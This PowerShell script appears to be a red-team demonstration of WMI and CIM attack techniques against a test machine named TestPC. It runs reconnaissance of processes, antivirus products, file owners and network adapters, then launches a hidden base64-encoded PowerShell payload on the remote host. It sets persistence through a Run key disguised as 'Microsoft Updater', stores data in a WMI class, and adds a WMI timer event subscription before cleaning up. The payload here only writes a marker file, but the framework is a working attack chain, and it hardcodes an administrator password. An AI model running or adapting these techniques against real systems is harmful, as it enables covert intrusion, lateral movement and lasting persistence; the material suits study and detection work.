#############
### SETUP ###
#############

# Set up remote session
$Credential = Get-Credential TestUser
$AdminCred = Get-Credential Administrator
$SessionOption = New-CimSessionOption -Protocol Dcom
$CimSession = New-CimSession -Credential $Credential -ComputerName TestPC -SessionOption $SessionOption
$AdminCimSession = New-CimSession -Credential $AdminCred -ComputerName TestPC -SessionOption $SessionOption

# Simple test payload
$EvilPayload = {
    Write-Host 'Applying updates...'
    "You were owned at $([DateTime]::Now)" | Out-File (Join-Path $Env:TEMP result.txt) -Append
    Start-Sleep -Seconds 2
}

$EvilEncodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($EvilPayload))
$WeaponizedPayload = 'powershell -nop -noni -w hidden -enc CgAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAnAEEAcABwAGwAeQBpAG4AZwAgAHUAcABkAGEAdABlAHMALgAuAC4AJwAKACAAIAAgACAAIgBZAG8AdQAgAHcAZQByAGUAIABvAHcAbgBlAGQAIABhAHQAIAAkACgAWwBEAGEAdABlAFQAaQBtAGUAXQA6ADoATgBvAHcAKQAiACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgACgASgBvAGkAbgAtAFAAYQB0AGgAIAAkAEUAbgB2ADoAVABFAE0AUAAgAHIAZQBzAHUAbAB0AC4AdAB4AHQAKQAgAC0AQQBwAHAAZQBuAGQACgAgACAAIAAgAFMAdABhAHIAdAAtAFMAbABlAGUAcAAgAC0AUwBlAGMAbwBuAGQAcwAgADIACgA='

#############
### RECON ###
#############

#region Recon
# Determine operating system
Get-CimInstance -CimSession $CimSession -ClassName Win32_OperatingSystem | Format-List *

# List running processes and display command line invocation
Get-CimInstance -CimSession $CimSession -ClassName Win32_Process | Select-Object -Property ProcessId, ProcessName, CommandLine

# See what AV and Antispyware products are installed
Get-CimInstance -CimSession $CimSession -Namespace 'root/securitycenter2' -ClassName AntiVirusProduct
Get-CimInstance -CimSession $CimSession -Namespace 'root/securitycenter2' -ClassName AntiSpywareProduct

# List out all .doc files with the associated owner
Get-CimInstance -CimSession $CimSession -ClassName CIM_DataFile -Filter 'Path="\\docs\\" AND Extension="txt"' | % {
    $FileSecuritySetting = Get-CimInstance -CimSession $CimSession -Query "ASSOCIATORS OF {CIM_DataFile.Name=`"$($_.Name.Replace('\','\\'))`"} WHERE AssocClass=Win32_SecuritySettingOfLogicalFile"
    
    $FileACL = Invoke-CimMethod -CimSession $CimSession -InputObject $FileSecuritySetting -MethodName GetSecurityDescriptor | Select-Object -ExpandProperty Descriptor

    $FileOwner = "{0}\{1}" -f $FileACL.Owner.Domain, $FileACL.Owner.Name

    $DocProperties = [Ordered] @{
        FileOwner = $FileOwner
        FullPath = $_.Name
        FileSize = $_.FileSize
        Modified = $_.LastModified
        Accessed = $_.LastAccessed
        Created = $_.CreationDate
    }

    New-Object PSObject -Property $DocProperties
}


# Get information on all network adapters with a configured default gateway
Get-CimInstance -CimSession $CimSession -ClassName Win32_NetworkAdapter | % {
    $Settings = Get-CimInstance -CimSession $CimSession -Query "ASSOCIATORS OF {Win32_NetworkAdapter.DeviceID=`"$($_.DeviceID)`"} WHERE AssocClass=Win32_NetworkAdapterSetting"
    $Adapter = $_

    if ($Settings.IPAddress -and $Settings.DefaultIPGateway) {
        $AdapterSettings = [Ordered] @{
            Name = $Adapter.Name
            MACAddress = $Adapter.MACAddress
            IPAddress = $Settings.IPAddress
            DefaultGateway = $Settings.DefaultIPGateway
        }

        New-Object PSObject -Property $AdapterSettings
    }
}
#endregion

###############
### ATTACKS ###
###############

#region Attack: Lateral movement
Invoke-CimMethod -CimSession $CimSession -Namespace root/cimv2 -Class Win32_Process -Name Create -Arguments @{CommandLine=$WeaponizedPayload}

$PayloadResultFilter = 'Name="C:\\Users\\TestUser\\AppData\\Local\\Temp\\result.txt"'
$PayloadExecutionConfirmation = Get-CimInstance -CimSession $CimSession -ClassName CIM_DataFile -Filter $PayloadResultFilter
$PayloadExecutionConfirmation | fl *
#endregion

#region Attack: Perform registry persistence
$Arguments = @{
    hDefKey = [UInt32] 2147483649 # HKCU
    sSubKeyName = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    sValueName = 'Microsoft Updater'
    sValue = $WeaponizedPayload
}

# Note: the order of arguments is very important
Invoke-CimMethod -CimSession $CimSession -Namespace root/default -Class StdRegProv -Name SetStringValue -Arguments $Arguments
#endregion

#region Attack: Create a WMI class and stuff data in it. APT28 TTP
# Establish remote WMI connection
$Options = New-Object Management.ConnectionOptions
$Options.Username = 'Administrator'
$Options.Password = 'admin'
$Options.EnablePrivileges = $True
$Connection = New-Object Management.ManagementScope
$Connection.Path = '\\TestPC\root\cimv2'
$Connection.Options = $Options
$Connection.Connect()

# "Push" file contents
$EvilClass = New-Object Management.ManagementClass($Connection, [String]::Empty, $null)
$EvilClass['__CLASS'] = 'Win32_EvilClass'
$EvilClass.Properties.Add('EvilProperty', [Management.CimType]::String, $False)
$EvilClass.Properties['EvilProperty'].Value = "This is not the malware you're looking for"
$EvilClass.Put()
#endregion

#region Attack: WMI persistence
$TimerArgs = @{
    IntervalBetweenEvents = ([UInt32] 10000) # Trigger every ten seconds
    SkipIfPassed = $False
    TimerId = 'PayloadTrigger'
}

$Timer = New-CimInstance -CimSession $CimSession -Namespace root/cimv2 -Class __IntervalTimerInstruction -Arguments $TimerArgs

$EventFilterArgs = @{
    EventNamespace = 'root/cimv2'
    Name = 'TimerTrigger'
    Query = 'SELECT * FROM __TimerEvent WHERE TimerID = "PayloadTrigger"'
    QueryLanguage = 'WQL'
}

$Filter = New-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName __EventFilter -Property $EventFilterArgs

$CommandLineConsumerArgs = @{
    Name = 'ExecuteEvilPowerShell'
    CommandLineTemplate = $WeaponizedPayload
}

$Consumer = New-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName CommandLineEventConsumer -Property $CommandLineConsumerArgs

$FilterToConsumerArgs = @{
    Filter = [Ref] $Filter
    Consumer = [Ref] $Consumer
}

$FilterToConsumerBinding = New-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName __FilterToConsumerBinding -Property $FilterToConsumerArgs
#endregion

###############
### CLEANUP ###
###############

#region Cleanup
# Remove registry persistence
$Arguments = @{
    hDefKey = [UInt32] 2147483649 # HKCU
    sSubKeyName = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
    sValueName = 'Microsoft Updater'
}

# Note: the order of arguments is very important
Invoke-CimMethod -CimSession $CimSession -Namespace root/default -Class StdRegProv -Name DeleteValue -Arguments $Arguments

# Remove permanent WMI artifacts
Get-CimInstance -CimSession $CimSession -Namespace root/cimv2 -ClassName __IntervalTimerInstruction -Filter 'TimerId="PayloadTrigger"' | Remove-CimInstance
Get-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName __EventFilter | Remove-CimInstance
Get-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName __EventConsumer | Remove-CimInstance
Get-CimInstance -CimSession $CimSession -Namespace root/subscription -ClassName __FilterToConsumerBinding | Remove-CimInstance

# Delete the malicious WMI class
$EvilClass.Delete()

$PayloadResultFilter = 'Name="C:\\Users\\TestUser\\AppData\\Local\\Temp\\result.txt"'
$PayloadExecutionConfirmation = Get-CimInstance -CimSession $AdminCimSession -ClassName CIM_DataFile -Filter $PayloadResultFilter
Invoke-CimMethod -CimSession $AdminCimSession -InputObject $PayloadExecutionConfirmation -MethodName Delete

# Delete payload execution artifacts
$PayloadResultFilter = 'Name="C:\\Windows\\Temp\\result.txt"'
$PayloadExecutionConfirmation = Get-CimInstance -CimSession $AdminCimSession -ClassName CIM_DataFile -Filter $PayloadResultFilter
Invoke-CimMethod -CimSession $AdminCimSession -InputObject $PayloadExecutionConfirmation -MethodName Delete
#endregion
